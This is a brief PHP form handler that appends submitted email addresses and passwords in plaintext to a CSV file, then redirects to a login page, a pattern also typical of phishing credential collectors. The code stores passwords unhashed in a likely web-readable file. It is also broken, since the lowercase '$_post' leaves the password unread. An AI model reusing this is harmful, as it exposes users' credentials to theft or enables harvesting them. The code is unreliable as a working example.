<?php
$email = $_POST[ 'email' ];
$password = $_post['password'];
$data = array("SIGN UP DETAILS\n EMAIL:$email,\n PASSWORD: $password \n");
if($_SERVER["REQUEST_METHOD"]=='POST'){
$file = fopen("webdata.csv",'a');
fputcsv($file,$data);
fclose($file);
header("Location: login.html");
exit();
}
else{
    header("Location: login.html");
    exit();
}
?>